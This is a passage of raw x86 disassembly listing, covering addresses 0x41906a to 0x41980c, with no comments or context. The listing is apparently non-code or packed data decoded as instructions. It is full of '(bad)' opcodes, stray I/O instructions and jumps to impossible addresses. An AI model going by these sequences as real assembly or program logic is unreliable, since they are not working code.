  41906a:	add    BYTE PTR [eax-0x405a67a4],dl
  419070:	popf   
  419071:	and    DWORD PTR [ecx],ebp
  419073:	repz icebp 
  419075:	xor    bh,BYTE PTR [ecx-0x16ed87f3]
  41907b:	sbb    al,BYTE PTR [edi]
  41907d:	xor    esi,DWORD PTR [ecx-0x7acd08f6]
  419083:	jne    0x41907b
  419085:	xor    al,ch
  419087:	xchg   edx,eax
  419088:	je     0x4190dd
  41908a:	int    0xfb
  41908c:	jl     0x4190b5
  41908e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41908f:	mov    edi,0x16836cbd
  419094:	jb     0x4190fa
  419096:	out    0x94,al
  419098:	inc    edi
  419099:	adc    BYTE PTR [eax+0x47],dh
  41909c:	rol    DWORD PTR [esi],1
  41909e:	out    dx,al
  41909f:	in     al,dx
  4190a0:	jge    0x419116
  4190a2:	adc    dl,BYTE PTR [eax-0x2f]
  4190a5:	push   es
  4190a6:	push   esp
  4190a7:	cdq    
  4190a8:	sub    edx,DWORD PTR [ebx+0xd]
  4190ab:	cmp    BYTE PTR [ebp+0x9702597],bh
  4190b1:	cli    
  4190b2:	or     BYTE PTR [ecx],dl
  4190b4:	(bad)  
  4190b5:	xor    bh,BYTE PTR [ecx]
  4190b7:	xchg   esp,eax
  4190b8:	add    DWORD PTR [edx],ebx
  4190ba:	jb     0x41909f
  4190bc:	je     0x419111
  4190be:	vhaddps xmm2,xmm2,XMMWORD PTR [edi+0x74a1303d]
  4190c6:	shr    bh,cl
  4190c8:	rol    BYTE PTR [edx],1
  4190ca:	add    BYTE PTR [ecx+ebx*4],ah
  4190cd:	jmp    0x419113
  4190cf:	add    BYTE PTR [eax],al
  4190d1:	add    BYTE PTR [eax],al
  4190d3:	add    BYTE PTR [ebp+0x41],dl
  4190d6:	xchg   edi,eax
  4190d7:	inc    esp
  4190d8:	inc    ebp
  4190d9:	push   ebp
  4190da:	jmp    0x419128
  4190dc:	aad    0x90
  4190de:	pop    ecx
  4190e0:	sti    
  4190e1:	xor    DWORD PTR [ebx+0x24],ebp
  4190e4:	mov    DWORD PTR [esi+0x7c52b16b],esi
  4190ea:	aam    0x44
  4190ec:	xchg   ebp,eax
  4190ed:	xchg   edx,eax
  4190ee:	out    dx,al
  4190ef:	mov    dh,BYTE PTR ds:0x35397e5d
  4190f5:	pop    ebp
  4190f6:	jp     0x41916e
  4190f8:	repz sub DWORD PTR [ebx+0x24],edx
  4190fc:	loope  0x419127
  4190fe:	pop    ebx
  4190ff:	and    al,0xc5
  419101:	leave  
  419102:	push   ss
  419103:	mov    esi,ebp
  419105:	pop    esp
  419106:	add    cl,BYTE PTR [ebx-0x7ff9a313]
  41910c:	sbb    eax,0x9effff5d
  419111:	or     eax,0xf1660fd6
  419116:	bound  ecx,QWORD PTR [ebx]
  419118:	xor    ch,BYTE PTR [ebp+0x32]
  41911b:	pusha  
  41911c:	pop    ss
  41911d:	jnp    0x419171
  41911f:	and    al,0xa1
  419121:	cmp    cl,BYTE PTR [esi]
  419123:	add    BYTE PTR [edx+0x39b71bb6],0xfe
  41912a:	inc    edx
  41912b:	and    al,0x91
  41912d:	sti    
  41912e:	inc    edx
  41912f:	and    al,0xd9
  419131:	call   0xb77bb588
  419136:	xchg   esi,eax
  419137:	add    al,0x0
  419139:	add    BYTE PTR [eax],al
  41913b:	add    BYTE PTR [eax],al
  41913d:	aaa    
  41913e:	div    esi
  419140:	or     BYTE PTR [ecx-0x45fefb96],dh
  419146:	call   0x8adf115b
  41914b:	jbe    0x41914d
  41914d:	nop
  41914e:	xchg   esp,eax
  41914f:	xchg   edi,eax
  419150:	mov    al,0x90
  419152:	mov    DWORD PTR [edx],edx
  419154:	sbb    BYTE PTR [ebx+0x747c9281],0x75
  41915b:	adc    cl,BYTE PTR [edx+0x7fe77d93]
  419161:	mov    WORD PTR [ebp+0x4],?
  419164:	add    BYTE PTR [eax+eax*4+0x6d],bh
  419168:	push   esp
  419169:	mov    ah,0x69
  41916b:	mov    eax,0xfaad4438
  419170:	jae    0x41912e
  419172:	pop    esp
  419173:	imul   ecx,edi,0x37f61e19
  419179:	or     esp,DWORD PTR [esi]
  41917b:	neg    BYTE PTR [edi-0x7c]
  41917e:	lea    ebp,[edx+0x1]
  419181:	sbb    BYTE PTR [esi+0x8],bl
  419184:	mov    edi,0x4c6a81b9
  419189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41918a:	mov    bl,BYTE PTR [eax+0x44]
  41918d:	ins    BYTE PTR es:[edi],dx
  41918e:	ja     0x4191a3
  419190:	adc    esi,0x94070d87
  419196:	pop    ecx
  419197:	pop    eax
  419198:	inc    esp
  419199:	je     0x4191f2
  41919b:	adc    cl,BYTE PTR [eax+0x23a68493]
  4191a1:	add    BYTE PTR [eax],al
  4191a3:	add    BYTE PTR [eax],al
  4191a5:	add    BYTE PTR [eax+ecx*4-0x2278b0b8],dh
  4191ac:	imul   BYTE PTR [edi]
  4191ae:	or     ecx,ebp
  4191b0:	mul    BYTE PTR [edi]
  4191b2:	ja     0x419191
  4191b4:	div    BYTE PTR [edi]
  4191b6:	outs   dx,DWORD PTR ds:[esi]
  4191b7:	in     eax,0xf6
  4191b9:	aas    
  4191ba:	js     0x4191fd
  4191bc:	cmp    eax,0x22885ffd
  4191c1:	adc    DWORD PTR [eax-0x42],0xffffffd6
  4191c5:	cld    
  4191c6:	les    esi,FWORD PTR [ebp-0x4d2b7712]
  4191cc:	fcmovnb st,st(3)
  4191ce:	cmp    al,0x6
  4191d0:	aam    0xf7
  4191d2:	or     BYTE PTR [esi],al
  4191d4:	(bad)  
  4191d6:	sub    al,0x6
  4191d8:	aam    0xd7
  4191da:	dec    ebp
  4191db:	scas   eax,DWORD PTR es:[edi]
  4191dc:	div    BYTE PTR [edx]
  4191de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191df:	(bad)  
  4191e0:	or     edi,DWORD PTR [edi-0x4c]
  4191e3:	(bad)  
  4191e4:	rcl    esi,cl
  4191e6:	pop    ss
  4191e7:	not    bl
  4191e9:	jmp    0x9bf7:0xea1bf60f
  4191f0:	inc    ebp
  4191f1:	xor    dh,ch
  4191f3:	es mov esp,0xe42dafe7
  4191f9:	add    ebx,DWORD PTR [ecx]
  4191fb:	neg    BYTE PTR [ebx]
  4191fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191fe:	inc    ecx
  4191ff:	(bad)  
  419201:	dec    ecx
  419202:	inc    eax
  419203:	mov    bh,dl
  419205:	sbb    cl,bh
  419207:	jp     0x419202
  419209:	xor    eax,0x0
  41920e:	add    BYTE PTR [ecx],bl
  419210:	out    0xdb,al
  419212:	(bad)  
  419213:	or     dh,bl
  419215:	rcl    edi,cl
  419217:	or     dh,dh
  419219:	fcomi  st,st(7)
  41921b:	adc    BYTE PTR [eax-0x18],dh
  41921e:	xchg   BYTE PTR [ebx+0x73d75ea1],bh
  419224:	not    al
  419226:	push   esi
  419227:	test   DWORD PTR [esi],ebp
  419229:	in     eax,0x2f
  41922b:	lea    edi,[edx+0x71]
  41922e:	mov    edi,0x49790eb3
  419233:	mov    al,ds:0xf14c035
  419238:	out    dx,eax
  419239:	sbb    edi,eax
  41923b:	test   al,0xf6
  41923d:	adc    ecx,esp
  41923f:	xchg   esp,eax
  419240:	mov    ebp,DWORD PTR es:[edi]
  419243:	pop    ebp
  419244:	jp     0x419251
  419246:	ror    DWORD PTR [eax],1
  419248:	jno    0x419259
  41924a:	pop    ss
  41924b:	pop    ebp
  41924c:	xor    edx,ebx
  41924e:	sbb    eax,0x6a0e9ece
  419253:	jo     0x419213
  419255:	xchg   ecx,eax
  419256:	add    eax,0x6a0eaa28
  41925b:	clc    
  41925c:	aad    0x12
  41925e:	jmp    0xba86779f
  419263:	pop    ecx
  419264:	ret    
  419265:	into   
  419266:	push   ss
  419267:	dec    edx
  419268:	ret    
  419269:	leave  
  41926a:	bound  edi,QWORD PTR [ebx-0x3abccf]
  419270:	xor    BYTE PTR [ebx+0xd],ch
  419273:	add    BYTE PTR [eax],al
  419275:	add    BYTE PTR [eax],al
  419277:	add    ah,dl
  419279:	xor    BYTE PTR [ebx+0x5],dl
  41927c:	in     al,0x30
  41927e:	arpl   WORD PTR ds:0x54b30cc,cx
  419284:	add    cl,0x52
  419287:	or     eax,0xec9ca6d0
  41928c:	lea    esi,[edx-0x2a0f9df2]
  419292:	push   esi
  419293:	cli    
  419294:	mov    ch,BYTE PTR [ebx]
  419296:	aam    0x70
  419298:	rcl    ch,1
  41929a:	cmp    ch,BYTE PTR [eax]
  41929c:	ins    BYTE PTR es:[edi],dx
  41929d:	mov    ah,0x97
  41929f:	xchg   ebp,eax
  4192a0:	mov    bh,0xc9
  4192a2:	and    DWORD PTR [ebx],edi
  4192a4:	jle    0x79a109c8
  4192aa:	out    dx,al
  4192ab:	jmp    0x997478c4
  4192b0:	or     al,0xaf
  4192b2:	test   DWORD PTR [eax+0x58],esp
  4192b5:	aad    0x32
  4192b7:	and    dl,bl
  4192b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192ba:	xchg   edx,eax
  4192bb:	xchg   ecx,eax
  4192bc:	xchg   edx,eax
  4192bd:	mov    dl,0xe
  4192bf:	fs sub al,0x76
  4192c2:	cwde   
  4192c3:	sbb    eax,0x97a978
  4192c8:	lods   eax,DWORD PTR ds:[esi]
  4192c9:	mov    ch,BYTE PTR [edx]
  4192cb:	(bad)  
  4192cc:	lods   eax,DWORD PTR ds:[esi]
  4192cd:	mov    al,BYTE PTR [esi]
  4192cf:	add    DWORD PTR [ecx],edi
  4192d1:	mov    ch,0xe
  4192d3:	mov    esi,edx
  4192d5:	test   DWORD PTR [edx+0x24],ecx
  4192d8:	test   DWORD PTR [ecx+0x79],ecx
  4192db:	mov    eax,DWORD PTR [eax]
  4192dd:	add    BYTE PTR [eax],al
  4192df:	add    BYTE PTR [eax],al
  4192e1:	popf   
  4192e2:	mov    al,BYTE PTR [esi]
  4192e4:	jmp    0x419323
  4192e6:	not    BYTE PTR [edx+0x24]
  4192e9:	dec    ebp
  4192ea:	mov    WORD PTR [edx],ss
  4192ec:	xchg   edi,eax
  4192ed:	sbb    al,0x67
  4192ef:	xchg   edi,eax
  4192f0:	ret    0xe052
  4192f3:	imul   edx,DWORD PTR [edx],0x24326972
  4192f9:	inc    eax
  4192fa:	test   eax,0x74ec7593
  4192ff:	daa    
  419300:	(bad)
  419303:	xchg   edi,eax
  419304:	pop    esp
  419305:	popf   
  419306:	mov    ds:0x40b23b56,al
  41930b:	sbb    cl,BYTE PTR [ebx-0x76f56ecb]
  419311:	sub    eax,0xfd890e91
  419316:	nop
  419317:	add    cl,BYTE PTR [ebx+0x3b029105]
  41931d:	ins    BYTE PTR es:[edi],dx
  41931e:	mov    dl,0x5a
  419320:	call   0x1473ac65
  419325:	xor    bl,BYTE PTR [ecx]
  419327:	xor    cl,BYTE PTR [eax+0x2c]
  41932a:	mov    ebx,0x70d20c6c
  41932f:	xor    ah,BYTE PTR [eax]
  419331:	adc    eax,0x5d44ebab
  419336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419337:	test   DWORD PTR [edx],0xc597ba4a
  41933d:	sub    bh,cl
  41933f:	adc    BYTE PTR [ecx+0x6a],al
  419342:	int3   
  419343:	daa    
  419344:	dec    esp
  419345:	add    BYTE PTR [eax],al
  419347:	add    BYTE PTR [eax],al
  419349:	add    BYTE PTR [eax+0x57bcea5],dl
  41934f:	adc    eax,0x4a823a7
  419354:	xlat   BYTE PTR ds:[ebx]
  419355:	and    esi,DWORD PTR [eax-0x5bdc60fc]
  41935b:	mov    ah,0x50
  41935d:	inc    eax
  41935e:	sbb    esi,ecx
  419360:	not    BYTE PTR [edi]
  419362:	or     eax,esi
  419364:	test   BYTE PTR [edi],0x6b
  419367:	dec    esp
  419368:	shr    DWORD PTR [eax],cl
  41936a:	sub    dh,BYTE PTR [ebp+0x29]
  41936d:	inc    ebp
  41936e:	sbb    esi,ecx
  419370:	test   BYTE PTR [edi],0x8f
  419373:	loopne 0x41934b
  419375:	and    edi,DWORD PTR [eax+0x2]
  419378:	iret   
  419379:	and    edi,DWORD PTR [eax-0x3432b270]
  41937f:	dec    edx
  419380:	mov    ebp,0xf63e0b05
  419385:	pop    ss
  419386:	jmp    0x41930f
  419388:	imul   eax,DWORD PTR [esp+esi*4-0x4f],0x1619cd69
  419390:	not    BYTE PTR [edi]
  419392:	or     DWORD PTR [esi-0xa],eax
  419395:	movups xmm6,XMMWORD PTR [esi]
  419398:	not    BYTE PTR [edi-0x70]
  41939b:	push   cs
  41939c:	mov    ebp,0x8f8c3d01
  4193a1:	jle    0x419339
  4193a3:	add    al,0xaf
  4193a5:	and    ecx,DWORD PTR [eax+0x4]
  4193a8:	pop    eax
  4193a9:	or     eax,0x4bf645ff
  4193ae:	add    BYTE PTR [eax],al
  4193b0:	add    BYTE PTR [eax],al
  4193b2:	add    cl,dl
  4193b4:	test   eax,0x80983910
  4193b9:	ins    DWORD PTR es:[edi],dx
  4193ba:	sti    
  4193bb:	nop
  4193bc:	mov    DWORD PTR [edx],edx
  4193be:	std    
  4193bf:	aam    0x65
  4193c1:	cli    
  4193c2:	jg     0x4193c8
  4193c4:	outs   dx,BYTE PTR ds:[esi]
  4193c5:	(bad)  
  4193c7:	or     dh,BYTE PTR [edx-0x23c178d]
  4193cd:	in     eax,dx
  4193ce:	jp     0x4193a4
  4193d0:	into   
  4193d1:	sbb    edi,DWORD PTR [esp+ecx*4-0x48]
  4193d5:	jno    0x41939e
  4193d7:	mov    bl,0xb8
  4193d9:	pop    edi
  4193da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193db:	xchg   ebp,eax
  4193dc:	mov    cl,0x5f
  4193de:	(bad)  
  4193df:	lea    esi,[ecx+esi*2+0x6fb773c7]
  4193e6:	(bad)  
  4193e7:	jge    0x41939c
  4193e9:	js     0x419430
  4193eb:	mov    WORD PTR [edx+edi*4],gs
  4193ee:	inc    ebx
  4193ef:	xor    BYTE PTR [esi-0x51e7bd0f],ch
  4193f5:	fnstsw WORD PTR [ecx-0x2c]
  4193f8:	into   
  4193f9:	(bad)  
  4193fa:	sub    eax,0x797724f
  4193ff:	push   cs
  419400:	push   0xfffffff2
  419402:	cmp    ebx,DWORD PTR [ecx]
  419404:	out    dx,al
  419405:	rcl    DWORD PTR [ebx],cl
  419407:	or     dh,ah
  419409:	xor    eax,0x79739105
  41940e:	inc    ebp
  41940f:	xchg   edx,eax
  419410:	sub    esp,ecx
  419412:	out    0xaf,eax
  419414:	sub    eax,DWORD PTR [ecx+0x7c]
  419417:	add    BYTE PTR [eax],al
  419419:	add    BYTE PTR [eax],al
  41941b:	add    BYTE PTR [esi+ecx*8+0x1b],dl
  41941f:	jmp    0x4193e0
  419421:	hlt    
  419422:	mov    BYTE PTR [edx+0x54],bh
  419425:	into   
  419426:	mov    edi,0xebce347a
  41942b:	jp     0x419489
  41942d:	into   
  41942e:	fstp   TBYTE PTR [edx+0x3c]
  419431:	into   
  419432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419433:	add    dl,dl
  419435:	sub    BYTE PTR [edi+eiz*8-0x184bd495],bh
  41943c:	push   edi
  41943d:	sub    esp,DWORD PTR [edx]
  41943f:	jmp    0x29ad:0xb0abce43
  419446:	setne  BYTE PTR [edi-0x4a]
  41944a:	xchg   ecx,eax
  41944b:	out    dx,al
  41944c:	lods   eax,DWORD PTR ds:[esi]
  41944d:	(bad)  
  41944e:	sbb    esi,DWORD PTR [eax+ecx*4-0x33]
  419452:	dec    edi
  419453:	jo     0x4194bd
  419455:	xor    ebp,DWORD PTR [edx]
  419457:	and    eax,0xbf6aba78
  41945c:	fldz   
  41945e:	xor    dh,BYTE PTR [ecx]
  419460:	(bad)  
  419462:	xor    al,BYTE PTR ds:0xf2f6b355
  419468:	js     0x419460
  41946a:	shl    DWORD PTR [edx-0x8],0xd1
  41946e:	ss jb  0x4194d1
  419471:	ror    BYTE PTR [edx],cl
  419473:	jb     0x419465
  419475:	rcl    DWORD PTR [esi+0x62],1
  419478:	push   eax
  419479:	sar    BYTE PTR [esi],cl
  41947b:	(bad)  
  41947c:	loopne 0x41944f
  41947e:	push   ds
  41947f:	sub    eax,DWORD PTR [eax]
  419481:	add    BYTE PTR [eax],al
  419483:	add    BYTE PTR [eax],al
  419485:	sub    DWORD PTR [ecx+0x1e],esp
  419488:	ins    DWORD PTR es:[edi],dx
  419489:	aam    0x77
  41948b:	out    dx,al
  41948c:	jbe    0x419417
  41948e:	out    0x32,al
  419490:	mov    ebp,0x49d07178
  419495:	xchg   edx,eax
  419496:	repz adc DWORD PTR [ecx+edx*4],ebp
  41949a:	jp     0x419434
  41949c:	mov    ch,0xef
  41949e:	cdq    
  41949f:	xchg   edi,eax
  4194a0:	popf   
  4194a1:	test   ecx,0xc5efc597
  4194a7:	sub    DWORD PTR [ebp+0x651de9b7],ebx
  4194ad:	(bad)  
  4194ae:	ja     0x41949e
  4194b0:	cs cmp esi,ebx
  4194b3:	xor    bl,ch
  4194b5:	cmp    dh,ch
  4194b7:	xor    ah,cl
  4194b9:	sub    esi,DWORD PTR [eax-0x282ad067]
  4194bf:	dec    ebx
  4194c0:	mov    dl,0x10
  4194c2:	outs   dx,DWORD PTR ds:[esi]
  4194c3:	and    eax,DWORD PTR [eax]
  4194c5:	imul   ebx,DWORD PTR [edx-0x6446ccf2],0xffffffe0
  4194cc:	or     DWORD PTR [ebp+0x55549736],0x61
  4194d3:	xchg   edi,eax
  4194d4:	rol    DWORD PTR [edx],0x36
  4194d7:	xor    bl,BYTE PTR [eax+eiz*8+0x6d]
  4194db:	xor    ch,BYTE PTR [eax]
  4194dd:	bnd jno 0x4194ea
  4194e0:	push   esi
  4194e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194e2:	sti    
  4194e3:	push   0x24
  4194e5:	lods   eax,DWORD PTR ds:[esi]
  4194e6:	stc    
  4194e7:	push   edx
  4194e8:	and    al,0x0
  4194ea:	add    BYTE PTR [eax],al
  4194ec:	add    BYTE PTR [eax],al
  4194ee:	cmp    eax,0xd92452fa
  4194f3:	mov    bl,0xdb
  4194f5:	add    ebp,ebx
  4194f7:	and    esp,0x178a65c6
  4194fd:	add    bh,dh
  4194ff:	ins    BYTE PTR es:[edi],dx
  419500:	xor    cl,BYTE PTR [edx]
  419502:	cmp    eax,edi
  419504:	pop    edx
  419505:	and    al,0x69
  419507:	stc    
  419508:	push   edx
  419509:	and    al,0x45
  41950b:	mov    ah,ch
  41950d:	(bad)  
  41950f:	jae    0x419521
  419511:	add    cl,bh
  419513:	stc    
  419514:	push   edx
  419515:	and    al,0xa5
  419517:	stc    
  419518:	push   edx
  419519:	and    al,0x91
  41951b:	sti    
  41951c:	push   edx
  41951d:	and    al,0x25
  41951f:	bound  edx,QWORD PTR [edi+0x3766955c]
  419525:	iret   
  419526:	jo     0x419595
  419528:	xor    dh,BYTE PTR [eax]
  41952a:	bound  ebp,QWORD PTR [ebp+0x32]
  41952d:	inc    esp
  41952e:	and    al,0xf8
  419530:	pop    edx
  419531:	and    al,0xc9
  419533:	stc    
  419534:	clc    
  419535:	mov    ebp,edi
  419537:	mov    WORD PTR [esi],gs
  419539:	cmp    esi,ebp
  41953b:	mov    WORD PTR [edx],?
  41953d:	(bad)  
  41953f:	(bad)  
  419540:	in     eax,dx
  419541:	call   DWORD PTR [eax+0x7444678b]
  419547:	aaa    
  419548:	mov    ecx,0x43f64709
  41954e:	cli    
  41954f:	pop    ecx
  419550:	fsubr  DWORD PTR [ecx+0x0]
  419553:	add    BYTE PTR [eax],al
  419555:	add    BYTE PTR [eax],al
  419557:	mov    al,ds:0xcc0d5040
  41955c:	cdq    
  41955d:	fnstcw WORD PTR [eax]
  41955f:	dec    eax
  419560:	jge    0x419508
  419562:	mov    esi,0xcd6184c0
  419567:	ret    0x618c
  41956a:	jmp    0x41952d
  41956c:	mov    esi,0xa5ac7439
  419571:	imul   ecx,DWORD PTR [esp+esi*2-0x13],0x6d
  419576:	dec    esp
  419577:	ins    BYTE PTR es:[edi],dx
  419578:	int    0x6b
  41957a:	push   esp
  41957b:	je     0x419502
  41957d:	imul   eax,DWORD PTR [esp+ebp*2-0x6f],0x6b
  419582:	ins    BYTE PTR es:[edi],dx
  419583:	je     0x419526
  419585:	or     bh,BYTE PTR [ecx-0x76c5e2de]
  41958b:	aam    0x6d
  41958d:	into   
  41958e:	or     al,0xe7
  419590:	(bad)
  419593:	adc    ebp,DWORD PTR [esi+0x389067ee]
  419599:	sub    ebx,DWORD PTR [edi]
  41959b:	dec    esp
  41959c:	ins    DWORD PTR es:[edi],dx
  41959d:	xchg   BYTE PTR [edx+0x446baba4],cl
  4195a3:	mov    ah,0x95
  4195a5:	shl    BYTE PTR [eax],1
  4195a7:	ret    0xcf12
  4195aa:	and    edi,DWORD PTR [eax+0x10]
  4195ad:	iret   
  4195ae:	and    edi,DWORD PTR [ebx+eax*8-0x31]
  4195b2:	dec    edi
  4195b4:	add    bl,BYTE PTR [edi-0x313cabdd]
  4195ba:	and    eax,DWORD PTR [eax]
  4195bc:	add    BYTE PTR [eax],al
  4195be:	add    BYTE PTR [eax],al
  4195c0:	pushf  
  4195c1:	mov    dl,BYTE PTR [eax+0x44]
  4195c4:	ins    BYTE PTR es:[edi],dx
  4195c5:	mov    dl,0x9b
  4195c7:	add    al,0x67
  4195c9:	out    0xd3,al
  4195cb:	out    0x25,eax
  4195cd:	loop   0x419649
  4195cf:	cmp    eax,0xc70ac23
  4195d4:	pmovmskb ebx,mm3
  4195d7:	fwait
  4195d8:	sbb    dh,dl
  4195da:	rcr    DWORD PTR [ebx-0x378f6542],cl
  4195e0:	mov    bl,0xd6
  4195e2:	bound  eax,QWORD PTR [esi]
  4195e4:	mov    bh,0x87
  4195e6:	out    dx,al
  4195e7:	xchg   ah,ch
  4195e9:	into   
  4195ea:	pop    ebx
  4195eb:	add    al,0xe3
  4195ed:	stos   DWORD PTR es:[edi],eax
  4195ee:	jo     0x419603
  4195f0:	push   esi
  4195f1:	out    dx,al
  4195f2:	adc    esp,DWORD PTR [eax-0x4f3845a9]
  4195f8:	mov    ds:0xbbe03473,eax
  4195fd:	jae    0x419633
  4195ff:	loopne 0x4195a8
  419601:	das    
  419602:	mov    eax,0xdbf610ff
  419607:	or     edx,DWORD PTR [eax-0x6ce1470d]
  41960d:	ins    BYTE PTR es:[edi],dx
  41960e:	cmp    al,0xe0
  419610:	jnp    0x4195c4
  419612:	shl    BYTE PTR [edi+0x1ee0673],0x19
  419619:	out    0xd3,al
  41961b:	fwait
  41961c:	clc    
  41961d:	stos   DWORD PTR es:[edi],eax
  41961e:	jo     0x41965d
  419620:	or     esi,ebx
  419622:	rcr    DWORD PTR [ebx+0x0],cl
  419628:	add    BYTE PTR [edi-0xa],dh
  41962b:	sbb    edx,DWORD PTR [edi]
  41962d:	nop
  41962e:	(bad)  
  41962f:	cmc    
  419630:	out    dx,al
  419631:	pop    ebx
  419632:	into   
  419633:	pop    ss
  419634:	mov    al,0xab
  419636:	xor    cl,BYTE PTR [ebx-0x1bd56dfd]
  41963c:	or     DWORD PTR [ecx],ebx
  41963e:	jno    0x419677
  419640:	sbb    ebx,DWORD PTR [eax-0x7652f0d6]
  419646:	jae    0x4195e1
  419648:	sub    BYTE PTR [edx+ecx*4-0x1],cl
  41964c:	outs   dx,DWORD PTR ds:[esi]
  41964d:	out    0xce,eax
  41964f:	sub    BYTE PTR cs:[edx+ebx*4-0x4f76526a],al
  419657:	xchg   esi,eax
  419658:	popf   
  419659:	mov    DWORD PTR [ecx-0x3c90522c],esi
  41965f:	punpckhdq mm2,mm1
  419662:	mov    dh,0x8e
  419664:	jne    0x4196c5
  419666:	(bad)  
  419667:	push   cs
  419668:	ficom  WORD PTR [eax]
  41966a:	sub    cl,BYTE PTR [edi]
  41966c:	jmp    0xe99dc904
  419671:	imul   esi,edx,0x6a
  419674:	or     eax,0x2498b288
  419679:	mov    esi,fs
  41967b:	sub    ch,BYTE PTR [ecx-0x8]
  41967e:	xchg   ebp,eax
  41967f:	add    cl,ch
  419681:	div    DWORD PTR [edi-0x59cfe2d7]
  419687:	(bad)  
  419688:	lock aas 
  41968a:	mov    dh,0x96
  41968c:	sub    al,0x0
  41968e:	add    BYTE PTR [eax],al
  419690:	add    BYTE PTR [eax],al
  419692:	xchg   esp,eax
  419693:	cmp    al,BYTE PTR [ebx]
  419695:	jmp    DWORD PTR [esp+esi*2+0x3a1c81d0]
  41969c:	push   ebx
  41969d:	out    dx,eax
  41969e:	xchg   edx,eax
  41969f:	cmp    edx,ecx
  4196a1:	test   al,0xac
  4196a3:	ret    0x1597
  4196a6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196a8:	iret   
  4196a9:	or     DWORD PTR [edx+edi*1+0x3a8dcf53],0x43
  4196b1:	pop    es
  4196b2:	xchg   ebp,eax
  4196b3:	js     0x419708
  4196b5:	add    eax,0x2f91717e
  4196ba:	nop
  4196bb:	pop    ebx
  4196bc:	sbb    ebp,ebx
  4196be:	cmp    DWORD PTR [eax+0x53],0x0
  4196c2:	popf   
  4196c3:	enter  0x880e,0xec
  4196c7:	mov    ch,0xeb
  4196c9:	je     0x419658
  4196cb:	mov    edx,0x84c71499
  4196d0:	jmp    0x419746
  4196d2:	fisttp QWORD PTR [ebp+0x55cd4c97]
  4196d8:	jmp    0x41974e
  4196da:	int    0x65
  4196dc:	jmp    0x419752
  4196de:	int    0x5d
  4196e0:	imul   BYTE PTR [ebp+0x3eb9b92]
  4196e6:	mov    eax,esi
  4196e8:	into   
  4196e9:	jne    0x419716
  4196eb:	call   0x245a:0xee4d2462
  4196f2:	mov    ch,0x9b
  4196f4:	bound  esp,QWORD PTR [eax+eax*1]
  4196f7:	add    BYTE PTR [eax],al
  4196f9:	add    BYTE PTR [eax],al
  4196fb:	xchg   ebp,eax
  4196fc:	out    dx,eax
  4196fd:	bound  esp,QWORD PTR [ebx*4-0x5edb9d65]
  419704:	hlt    
  419705:	push   ecx
  419706:	add    BYTE PTR [eax],bh
  419708:	call   0x247a:0xefd92462
  41970f:	lea    eax,[ecx+0x538d4496]
  419715:	xchg   esi,eax
  419716:	inc    esp
  419717:	pop    ebp
  419718:	push   ebx
  419719:	idiv   BYTE PTR [esi]
  41971b:	or     BYTE PTR [edx+0x525d8beb],bl
  419721:	sub    al,cl
  419723:	or     esi,DWORD PTR [edi+0x71845540]
  419729:	or     al,0x50
  41972b:	and    DWORD PTR [eax-0x4a16ff00],edx
  419731:	loopne 0x4196be
  419733:	cmc    
  419734:	nop
  419735:	mov    edi,DWORD PTR cs:0x358b5291
  41973c:	xchg   ecx,eax
  41973d:	adc    DWORD PTR ds:[eax-0x177efe62],0x6a
  419745:	imul   ebp,DWORD PTR [esp+esi*2+0x1b],0x176c4469
  41974d:	sti    
  41974e:	imul   esi,DWORD PTR [edi+esi*4-0x19],0xffffff8b
  419753:	pushf  
  419754:	mov    eax,ds:0x2f1bfd36
  419759:	into   
  41975a:	pop    edi
  41975b:	sbb    edx,DWORD PTR [edi]
  41975d:	into   
  41975e:	inc    edi
  41975f:	add    BYTE PTR [eax],al
  419761:	add    BYTE PTR [eax],al
  419763:	add    BYTE PTR [ebx],dl
  419765:	mov    al,ds:0x6aa98101
  41976a:	imul   ecx,DWORD PTR [esp+esi*4+0x29],0xdd97f7fb
  419772:	xor    ebx,edi
  419774:	jg     0x4197df
  419776:	aam    0x58
  419778:	xlat   BYTE PTR ds:[ebx]
  419779:	aam    0x4f
  41977b:	pop    esi
  41977c:	adc    ebx,DWORD PTR [esi]
  41977e:	stos   DWORD PTR es:[edi],eax
  41977f:	sar    DWORD PTR [ecx+ebx*2-0x3d],0x50
  419784:	(bad)  
  419785:	aam    0xb6
  419787:	and    eax,DWORD PTR [eax-0x67dc412e]
  41978d:	in     al,0x5b
  41978f:	cmp    esp,eax
  419791:	mov    ch,0xfe
  419793:	or     al,0x17
  419795:	or     dl,BYTE PTR [ebx]
  419797:	add    BYTE PTR [eax-0x5c77233a],dl
  41979d:	ins    DWORD PTR es:[edi],dx
  41979e:	imul   eax,DWORD PTR [esp+ebp*2+0x79],0x3663f511
  4197a6:	nop
  4197a7:	rcr    BYTE PTR [esi+ebp*1-0x199d0797],0xfe
  4197af:	sub    eax,0x650b251b
  4197b4:	add    cl,ch
  4197b6:	xor    eax,0xd39d3e0d
  4197bb:	mov    BYTE PTR [edx+esi*4+0x1b],al
  4197bf:	adc    al,0x91
  4197c1:	cmp    ch,0x6d
  4197c4:	push   ecx
  4197c5:	mov    ds:0x1bf8,al
  4197ca:	add    BYTE PTR [eax],al
  4197cc:	add    BYTE PTR [edi],cl
  4197ce:	pop    es
  4197cf:	adc    al,0x14
  4197d1:	mov    DWORD PTR [edi-0x56],ebx
  4197d4:	dec    eax
  4197d5:	sbb    edi,ebp
  4197d7:	adc    ecx,DWORD PTR [ecx+ecx*1]
  4197da:	neg    DWORD PTR [ebx]
  4197dc:	in     al,0x8
  4197de:	cld    
  4197df:	mov    edi,0x61b88478
  4197e4:	ret    
  4197e5:	data16 mov bl,0x3c
  4197e8:	call   0xe8297b8b
  4197ed:	xchg   ecx,eax
  4197ee:	out    0xdf,al
  4197f0:	out    0x93,eax
  4197f2:	in     eax,0xdb
  4197f4:	sbb    ah,BYTE PTR [esi+0x7f7bf63c]
  4197fa:	repnz mov ebp,0xe5e481ea
  419800:	sbb    al,BYTE PTR [esi+0x677bfe3c]
  419806:	repnz xor eax,0xcde461eb
  41980c:	sbb    cl,BYTE PTR [edx+0x4f7bf63c]
